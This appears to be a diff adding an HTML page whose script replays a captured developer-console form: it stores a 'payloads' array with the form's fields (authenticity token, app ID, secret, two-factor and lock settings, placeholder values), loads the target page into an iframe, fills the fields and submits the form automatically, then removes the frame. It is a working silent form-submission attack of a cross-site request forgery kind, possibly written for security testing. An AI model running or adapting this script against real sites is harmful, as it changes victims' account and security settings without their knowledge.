@@ -1,0 +1,186 @@
+<script>
+//    "referrer": "https://tet.tetcom/www/developers/editapplication?appId=aaaaaaaaaaa",
+
+payloads= [{
+    "action" : "https://tet.tetcom/www/developers/editapplication",
+    "origin" : "https://tet.tetcom/www/developers/editapplication?appId=aaaaaaaaaaa",
+    "method" : "post",
+    "outerHTML" : "<form action=\"/www/developers/editapplication\" method=\"post\" accept-charset=\"utf-8\" enctype=\"multipart/form-data\" id=\"edit_app\">\n<input type=\"hidden\" name=\"authenticityToken\" value=\"aaaaaaaaaaa\">\n    <div class=\"col-lg-11 col-md-10 col-sm-12 edit_service_box\">\n        <div id=\"whyCrossed\">\n            <p><b>¡IMPORTANTE!:</b> Si has creado operaciones para una aplicación, NO deberías necesitar consultar el estado usando el ID de aplicación. Igualmente ocurre si tienes operaciones anidadas. Una vez que una operación tiene operaciones hijas, el ID de aplicación de la operación padre no debería ser usado para llamadas de estado.</p>\n            <p>Nada te impide hacerlo, y funcionará, pero en las apps móviles, las aplicaciones con operaciones o las operaciones con hijos, no tienen las opciones de OTP, opción de Programar o Autobloqueo. En vez de eso, actúan como un tet maestro sobre todas las operaciones hijas, permitiendo bloquearlas o desbloquearlas todas con una sola acción..</p>\n            <a href=\"#\" onclick=\"this.parentNode.style.visibility='hidden';return false;\" align=\"right\">Cerrar</a>\n        </div>\n        <div id=\"img_box\">\n            <shit src=\"https://s3-eu-west-1.amazonaws.com/tet-ireland/aaaaaaaaaaa-1591547377116.png?1601746814845\">\n            <span style=\"display:block;\"> <a href=\"/www/developers/doc_image_req\" target=\"_blank\" title=\"Política y directrices de imágenes\">Directrices de imágenes <i class=\"icon-question-sign\"></i> </a></span>\n            <input type=\"file\" name=\"imageFile\" id=\"imageFile\" value=\"\" style=\"display:block; width:180px; margin-top:10px\">\n        </shit></div>\n        <div class=\"row\" style=\"margin-left:200px;\">\n            <div id=\"app_info\" class=\"app_info col-lg-8\">\n                <div class=\"row\">\n                    <div class=\"col-lg-6\">\n                        <label for=\"name\">Nombre</label>\n                        <input type=\"text\" name=\"name\" id=\"name\" value=\"PPPP\">\n                    </div>\n                    <div class=\"col-lg-5\">\n                        <label for=\"appId\">ID de aplicación <a href=\"#\" class=\"why\" onclick=\"showWhyDialog()\"><i class=\"icon-question-sign\"></i> </a></label>\n                        <input type=\"text\" id=\"appId\" value=\"aaaaaaaaaaa\" readonly=\"readonly\"> <input type=\"hidden\" name=\"appId\" value=\"aaaaaaaaaaa\">\n                    </div>\n                </div>\n\n                <div class=\"row\">\n                    <div class=\"col-lg-6\">\n\n                        <label for=\"secret\">Secreto</label>\n                        <input class=\"renew\" type=\"text\" value=\"aaaaaaaaaaa\" readonly=\"readonly\">\n                        <input class=\"btn_renew\" type=\"hidden\" name=\"secret\" id=\"secret\" value=\"aaaaaaaaaaa\">\n                    </div>\n                    <div class=\"col-lg-5\">\n                        <a class=\"appButton small-button submit btn_renew\" data-toggle=\"modal\" href=\"#renewSecretModal\"><i class=\"icon-refresh iconsize\"></i></a>\n                    </div>\n\n                </div>\n\n                <div class=\"row\">\n                    <div class=\"col-lg-4\">\n                        <label for=\"twoFactor\">2º factor OTP</label>\n                        <select id=\"twoFactor\" name=\"twoFactor\" class=\"js-select2\">\n                            <option value=\"DISABLED\" selected=\"selected\">Deshabilitado</option>\n                            <option value=\"OPT_IN\">Opcional</option>\n                            <option value=\"MANDATORY\">Obligatorio</option>\n                        </select>\n                    </div>\n                    <div class=\"col-lg-4\">\n                        <label for=\"lockOnRequest\">Bloquear tras consultar</label>\n                        <select id=\"lockOnRequest\" name=\"lockOnRequest\" class=\"js-select2\">\n                            <option value=\"DISABLED\" selected=\"selected\">Deshabilitado</option>\n                            <option value=\"OPT_IN\">Opcional</option>\n                            <option value=\"MANDATORY\">Obligatorio</option>\n                        </select>\n                    </div>\n                <div class=\"app_info col-lg-4\">\n                    <button class=\"submit\" type=\"submit\">\n                        Guardar cambios\n                    </button>\n                </div>\n                </div>\n\n            </div>\n            <div>\n                <div class=\"app_info col-lg-4\">\n                    <label for=\"contactEmail\" title=\"This information will be available for your users\">Correo electrónico de contacto</label>\n                    <input type=\"text\" name=\"contactEmail\" id=\"contactEmail\" value=\"\">\n                </div>\n                <div class=\"app_info col-lg-4\">\n                    <label for=\"contactPhone\" title=\"This information will be available for your users\">Teléfono de contacto</label>\n                    <input type=\"text\" name=\"contactPhone\" id=\"contactPhone\" value=\"\">\n                    <p>Información de contacto del desarrollador para mostrar en las alertas que recibe el usuario final</p>\n                </div>\n                \n            </div>\n        </div>\n    </div></form>",
+    "enctype" : "multipart/form-data",
+    "inputs" : [ 
+        {
+            "Type" : "hidden",
+            "name" : "authenticityToken",
+            "value" : "aaaaaaaaaaa",
+            "modified" : false
+        }, 
+        {
+            "Type" : "file",
+            "name" : "imageFile",
+            "value" : "",
+            "modified" : false
+        }, 
+        {
+            "Type" : "text",
+            "name" : "name",
+            "value" : "RRR",
+            "modified" : false
+        }, 
+        {
+            "Type" : "hidden",
+            "name" : "appId",
+            "value" : "aaaaaaaaaaaaaaaaaaa",
+            "modified" : false
+        }, 
+        {
+            "Type" : "hidden",
+            "name" : "secret",
+            "value" : "aaaaaaaaaaaaaaaaaaa",
+            "modified" : false
+        }, 
+        {
+            "Type" : "select-one",
+            "name" : "twoFactor",
+            "value" : "[{\"value\":\"DISABLED\",\"text\":\"Deshabilitado\"},{\"value\":\"OPT_IN\",\"text\":\"Opcional\"},{\"value\":\"MANDATORY\",\"text\":\"Obligatorio\"}]",
+            "modified" : false
+        }, 
+        {
+            "Type" : "select-one",
+            "name" : "lockOnRequest",
+            "value" : "[{\"value\":\"DISABLED\",\"text\":\"Deshabilitado\"},{\"value\":\"OPT_IN\",\"text\":\"Opcional\"},{\"value\":\"MANDATORY\",\"text\":\"Obligatorio\"}]",
+            "modified" : false
+        }, 
+        {
+            "Type" : "text",
+            "name" : "contactEmail",
+            "value" : "",
+            "modified" : false
+        }, 
+        {
+            "Type" : "text",
+            "name" : "contactPhone",
+            "value" : "",
+            "modified" : false
+        }
+    ],
+    "originalInputs" : [ 
+        {
+            "Type" : "hidden",
+            "name" : "authenticityToken",
+            "value" : "aaaaaaaaaaaaaaaaaaa",
+            "modified" : false
+        }, 
+        {
+            "Type" : "file",
+            "name" : "imageFile",
+            "value" : "",
+            "modified" : false
+        }, 
+        {
+            "Type" : "text",
+            "name" : "name",
+            "value" : "PPPP",
+            "modified" : false
+        }, 
+        {
+            "Type" : "hidden",
+            "name" : "appId",
+            "value" : "aaaaaaaaaaaaaaaaaaa",
+            "modified" : false
+        }, 
+        {
+            "Type" : "hidden",
+            "name" : "secret",
+            "value" : "aaaaaaaaaaaaaaaaaaa",
+            "modified" : false
+        }, 
+        {
+            "Type" : "select-one",
+            "name" : "twoFactor",
+            "value" : "[{\"value\":\"DISABLED\",\"text\":\"Deshabilitado\"},{\"value\":\"OPT_IN\",\"text\":\"Opcional\"},{\"value\":\"MANDATORY\",\"text\":\"Obligatorio\"}]",
+            "modified" : false
+        }, 
+        {
+            "Type" : "select-one",
+            "name" : "lockOnRequest",
+            "value" : "[{\"value\":\"DISABLED\",\"text\":\"Deshabilitado\"},{\"value\":\"OPT_IN\",\"text\":\"Opcional\"},{\"value\":\"MANDATORY\",\"text\":\"Obligatorio\"}]",
+            "modified" : false
+        }, 
+        {
+            "Type" : "text",
+            "name" : "contactEmail",
+            "value" : "",
+            "modified" : false
+        }, 
+        {
+            "Type" : "text",
+            "name" : "contactPhone",
+            "value" : "",
+            "modified" : false
+        }
+    ],
+    "queryForm" : "authenticityToken=aaaaaaaaaaaaaaaaaaa&imageFile=&name=PPPP&appId=aaaaaaaaaaaaaaaaaaa&secret=aaaaaaaaaaaaaaaaaaa&twoFactor=[{\"value\":\"DISABLED\",\"text\":\"Deshabilitado\"},{\"value\":\"OPT_IN\",\"text\":\"Opcional\"},{\"value\":\"MANDATORY\",\"text\":\"Obligatorio\"}]&lockOnRequest=[{\"value\":\"DISABLED\",\"text\":\"Deshabilitado\"},{\"value\":\"OPT_IN\",\"text\":\"Opcional\"},{\"value\":\"MANDATORY\",\"text\":\"Obligatorio\"}]&contactEmail=&contactPhone=&",
+    "id" : "f623155f8946aee61a9b74f9339c63b0",
+    "base64link" : "data:text/html;base64,PGNlbnRlcj48Zm9ybSBhY3Rpb249Ii93d3cvZGV2ZWxvcGVycy9lZGl0YXBwbGljYXRpb24iIG1ldGhvZD0icG9zdCIgYWNjZXB0LWNoYXJzZXQ9InV0Zi04IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBpZD0iZWRpdF9hcHAiPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhdXRoZW50aWNpdHlUb2tlbiIgdmFsdWU9IjA0ZWE5YzBlZjBiYzAyNWE4OTZhYjYzZTUwZTJjZDhmOTYzODkxNmYiPgogICAgPGRpdiBjbGFzcz0iY29sLWxnLTExIGNvbC1tZC0xMCBjb2wtc20tMTIgZWRpdF9zZXJ2aWNlX2JveCI+CiAgICAgICAgPGRpdiBpZD0id2h5Q3Jvc3NlZCI+CiAgICAgICAgICAgIDxwPjxiPsKhSU1QT1JUQU5URSE6PC9iPiBTaSBoYXMgY3JlYWRvIG9wZXJhY2lvbmVzIHBhcmEgdW5hIGFwbGljYWNpw7NuLCBOTyBkZWJlcsOtYXMgbmVjZXNpdGFyIGNvbnN1bHRhciBlbCBlc3RhZG8gdXNhbmRvIGVsIElEIGRlIGFwbGljYWNpw7NuLiBJZ3VhbG1lbnRlIG9jdXJyZSBzaSB0aWVuZXMgb3BlcmFjaW9uZXMgYW5pZGFkYXMuIFVuYSB2ZXogcXVlIHVuYSBvcGVyYWNpw7NuIHRpZW5lIG9wZXJhY2lvbmVzIGhpamFzLCBlbCBJRCBkZSBhcGxpY2FjacOzbiBkZSBsYSBvcGVyYWNpw7NuIHBhZHJlIG5vIGRlYmVyw61hIHNlciB1c2FkbyBwYXJhIGxsYW1hZGFzIGRlIGVzdGFkby48L3A+CiAgICAgICAgICAgIDxwPk5hZGEgdGUgaW1waWRlIGhhY2VybG8sIHkgZnVuY2lvbmFyw6EsIHBlcm8gZW4gbGFzIGFwcHMgbcOzdmlsZXMsIGxhcyBhcGxpY2FjaW9uZXMgY29uIG9wZXJhY2lvbmVzIG8gbGFzIG9wZXJhY2lvbmVzIGNvbiBoaWpvcywgbm8gdGllbmVuIGxhcyBvcGNpb25lcyBkZSBPVFAsIG9wY2nDs24gZGUgUHJvZ3JhbWFyIG8gQXV0b2Jsb3F1ZW8uIEVuIHZleiBkZSBlc28sIGFjdMO6YW4gY29tbyB1biBsYXRjaCBtYWVzdHJvIHNvYnJlIHRvZGFzIGxhcyBvcGVyYWNpb25lcyBoaWphcywgcGVybWl0aWVuZG8gYmxvcXVlYXJsYXMgbyBkZXNibG9xdWVhcmxhcyB0b2RhcyBjb24gdW5hIHNvbGEgYWNjacOzbi4uPC9wPgogICAgICAgICAgICA8YSBocmVmPSIjIiBvbmNsaWNrPSJ0aGlzLnBhcmVudE5vZGUuc3R5bGUudmlzaWJpbGl0eT0naGlkZGVuJztyZXR1cm4gZmFsc2U7IiBhbGlnbj0icmlnaHQiPkNlcnJhcjwvYT4KICAgICAgICA8L2Rpdj4KICAgICAgICA8ZGl2IGlkPSJpbWdfYm94Ij4KICAgICAgICAgICAgPHNoaXQgc3JjPSJodHRwczovL3MzLWV1LXdlc3QtMS5hbWF6b25hd3MuY29tL2xhdGNoLWlyZWxhbmQvRlROcU52aFliVkNrUEgzUmVMNHktMTU5MTU0NzM3NzExNi5wbmc/MTYwMTc0NjgxNDg0NSI+CiAgICAgICAgICAgIDxzcGFuIHN0eWxlPSJkaXNwbGF5OmJsb2NrOyI+IDxhIGhyZWY9Ii93d3cvZGV2ZWxvcGVycy9kb2NfaW1hZ2VfcmVxIiB0YXJnZXQ9Il9ibGFuayIgdGl0bGU9IlBvbMOtdGljYSB5IGRpcmVjdHJpY2VzIGRlIGltw6FnZW5lcyI+RGlyZWN0cmljZXMgZGUgaW3DoWdlbmVzIDxpIGNsYXNzPSJpY29uLXF1ZXN0aW9uLXNpZ24iPjwvaT4gPC9hPjwvc3Bhbj4KICAgICAgICAgICAgPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImltYWdlRmlsZSIgaWQ9ImltYWdlRmlsZSIgdmFsdWU9IiIgc3R5bGU9ImRpc3BsYXk6YmxvY2s7IHdpZHRoOjE4MHB4OyBtYXJnaW4tdG9wOjEwcHgiPgogICAgICAgIDwvc2hpdD48L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJyb3ciIHN0eWxlPSJtYXJnaW4tbGVmdDoyMDBweDsiPgogICAgICAgICAgICA8ZGl2IGlkPSJhcHBfaW5mbyIgY2xhc3M9ImFwcF9pbmZvIGNvbC1sZy04Ij4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InJvdyI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLWxnLTYiPgogICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJuYW1lIj5Ob21icmU8L2xhYmVsPgogICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0ibmFtZSIgaWQ9Im5hbWUiIHZhbHVlPSJQUFBQIj4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbGctNSI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9ImFwcElkIj5JRCBkZSBhcGxpY2FjacOzbiA8YSBocmVmPSIjIiBjbGFzcz0id2h5IiBvbmNsaWNrPSJzaG93V2h5RGlhbG9nKCkiPjxpIGNsYXNzPSJpY29uLXF1ZXN0aW9uLXNpZ24iPjwvaT4gPC9hPjwvbGFiZWw+CiAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBpZD0iYXBwSWQiIHZhbHVlPSJGVE5xTnZoWWJWQ2tQSDNSZUw0eSIgcmVhZG9ubHk9InJlYWRvbmx5Ij4gPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYXBwSWQiIHZhbHVlPSJGVE5xTnZoWWJWQ2tQSDNSZUw0eSI+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3ciPgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1sZy02Ij4KCiAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9InNlY3JldCI+U2VjcmV0bzwvbGFiZWw+CiAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCBjbGFzcz0icmVuZXciIHR5cGU9InRleHQiIHZhbHVlPSJGc0hhcnFmam1tR0hUVFBOQTdHWEVHNk5uclBuNEVkSnoycU1lVGJLIiByZWFkb25seT0icmVhZG9ubHkiPgogICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgY2xhc3M9ImJ0bl9yZW5ldyIgdHlwZT0iaGlkZGVuIiBuYW1lPSJzZWNyZXQiIGlkPSJzZWNyZXQiIHZhbHVlPSJGc0hhcnFmam1tR0hUVFBOQTdHWEVHNk5uclBuNEVkSnoycU1lVGJLIj4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbGctNSI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJhcHBCdXR0b24gc21hbGwtYnV0dG9uIHN1Ym1pdCBidG5fcmVuZXciIGRhdGEtdG9nZ2xlPSJtb2RhbCIgaHJlZj0iI3JlbmV3U2VjcmV0TW9kYWwiPjxpIGNsYXNzPSJpY29uLXJlZnJlc2ggaWNvbnNpemUiPjwvaT48L2E+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbGctNCI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9InR3b0ZhY3RvciI+MsK6IGZhY3RvciBPVFA8L2xhYmVsPgogICAgICAgICAgICAgICAgICAgICAgICA8c2VsZWN0IGlkPSJ0d29GYWN0b3IiIG5hbWU9InR3b0ZhY3RvciIgY2xhc3M9ImpzLXNlbGVjdDIiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0iRElTQUJMRUQiIHNlbGVjdGVkPSJzZWxlY3RlZCI+RGVzaGFiaWxpdGFkbzwvb3B0aW9uPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0iT1BUX0lOIj5PcGNpb25hbDwvb3B0aW9uPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0iTUFOREFUT1JZIj5PYmxpZ2F0b3Jpbzwvb3B0aW9uPgogICAgICAgICAgICAgICAgICAgICAgICA8L3NlbGVjdD4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbGctNCI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9ImxvY2tPblJlcXVlc3QiPkJsb3F1ZWFyIHRyYXMgY29uc3VsdGFyPC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICAgICAgPHNlbGVjdCBpZD0ibG9ja09uUmVxdWVzdCIgbmFtZT0ibG9ja09uUmVxdWVzdCIgY2xhc3M9ImpzLXNlbGVjdDIiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0iRElTQUJMRUQiIHNlbGVjdGVkPSJzZWxlY3RlZCI+RGVzaGFiaWxpdGFkbzwvb3B0aW9uPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0iT1BUX0lOIj5PcGNpb25hbDwvb3B0aW9uPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0iTUFOREFUT1JZIj5PYmxpZ2F0b3Jpbzwvb3B0aW9uPgogICAgICAgICAgICAgICAgICAgICAgICA8L3NlbGVjdD4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImFwcF9pbmZvIGNvbC1sZy00Ij4KICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCI+CiAgICAgICAgICAgICAgICAgICAgICAgIEd1YXJkYXIgY2FtYmlvcwogICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2PgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYXBwX2luZm8gY29sLWxnLTQiPgogICAgICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9ImNvbnRhY3RFbWFpbCIgdGl0bGU9IlRoaXMgaW5mb3JtYXRpb24gd2lsbCBiZSBhdmFpbGFibGUgZm9yIHlvdXIgdXNlcnMiPkNvcnJlbyBlbGVjdHLDs25pY28gZGUgY29udGFjdG88L2xhYmVsPgogICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJjb250YWN0RW1haWwiIGlkPSJjb250YWN0RW1haWwiIHZhbHVlPSIiPgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJhcHBfaW5mbyBjb2wtbGctNCI+CiAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGZvcj0iY29udGFjdFBob25lIiB0aXRsZT0iVGhpcyBpbmZvcm1hdGlvbiB3aWxsIGJlIGF2YWlsYWJsZSBmb3IgeW91ciB1c2VycyI+VGVsw6lmb25vIGRlIGNvbnRhY3RvPC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iY29udGFjdFBob25lIiBpZD0iY29udGFjdFBob25lIiB2YWx1ZT0iIj4KICAgICAgICAgICAgICAgICAgICA8cD5JbmZvcm1hY2nDs24gZGUgY29udGFjdG8gZGVsIGRlc2Fycm9sbGFkb3IgcGFyYSBtb3N0cmFyIGVuIGxhcyBhbGVydGFzIHF1ZSByZWNpYmUgZWwgdXN1YXJpbyBmaW5hbDwvcD4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgCiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgPC9kaXY+PC9mb3JtPjwvY2VudGVyPg==",
+    "inject" : false,
+    "used" : false
+}
+]
+
+// AÑADIR EL ORIGIN/REFERRER AL PAYLOAD DE LOS FORMS ENVIADOS, llamarlo referrer
+
+
+/* It creates a iframe embedding the target form:
+ * referrer: or Origin, the URL that shows the target form.
+ * id: id of the form, this is used to identify the new created form.
+*/
+function createEmbeddedForm(referrer, id){
+    newNode= document.createElement("iframe")
+    newNode.src=referrer
+    newNode.style="width:500px;height:400px"
+    newNode.id=id
+    document.body.appendChild(newNode)
+}
+
+
+function getIframeDocumentReference(ifrm_ref){
+    var ifrm_doc_ref = (ifrm_ref.contentWindow || ifrm_ref.contentDocument);
+    if (ifrm_doc_ref.document) ifrm_doc_ref = ifrm_doc_ref.document;   
+    return ifrm_doc_ref
+}
+
+// It fills out the embedded form
+function setInputValue(ifrm_doc_ref, name, value){
+    input_ref = ifrm_doc_ref.getElementsByName(name)[0]
+    input_ref.value=value
+    return input_ref
+}
+
+
+function injectForm(ifrm_ref, payload){
+    console.log("injectForm")
+    ifrm_doc_ref = getIframeDocumentReference(ifrm_ref)
+    
+    input_ref="";
+    for(index in payload.inputs){
+        name=payload.inputs[index].name
+        value=payload.inputs[index].value
+        input_ref = setInputValue(ifrm_doc_ref, name, value)
+    }
+    ifrm_ref.onload=function() { this.remove()}
+    input_ref.form.submit()
+    //ifrm_ref.remove()
+}
+
+function main(){
+    for(i in payloads){
+        createEmbeddedForm(payloads[i].origin, payloads[i].id)
+        ifrm_ref = document.getElementById(payloads[i].id)
+        
+        ifrm_ref.onload= function() { injectForm(ifrm_ref, payloads[i]) }
+        
+    }
+}
+
+main()
+</script>
